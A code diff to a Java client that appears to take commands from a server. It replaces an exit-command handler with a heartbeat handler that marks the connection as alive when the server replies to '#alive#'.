@@ -2,22 +2,21 @@ package com.ghostj.client.func;
 
 import com.ghostj.client.cmd.AbstractFunc;
 import com.ghostj.client.cmd.AbstractProcessor;
-import com.ghostj.client.core.ClientMain;
-import com.ghostj.client.conn.HandleConn;
+import com.ghostj.client.conn.CheckAliveTimer;
 
 /**
- * 关闭客户端的指令
+ * 接收服务器对心跳数据的回复
  * @author Rock Chin
  */
-public class FuncExit implements AbstractFunc {
+public class FuncSendAlive implements AbstractFunc {
     @Override
     public String getFuncName() {
-        return "!!exit";
+        return "#alive#";
     }
 
     @Override
     public String[] getParamsModel() {
-        return new String[]{"<fullName>"};
+        return new String[0];
     }
 
     @Override
@@ -27,17 +26,11 @@ public class FuncExit implements AbstractFunc {
 
     @Override
     public int getMinParamsAmount() {
-        return 1;
+        return 0;
     }
 
     @Override
     public void run(String[] params, String cmd, AbstractProcessor processor) {
-        if(params[0].equals(ClientMain.name)){
-            HandleConn.sendFinishToServer();
-            System.exit(0);
-        }else {
-            HandleConn.writeToServer("名称不正确");
-            HandleConn.sendFinishToServer();
-        }
+        CheckAliveTimer.setAlive(true);
     }
 }
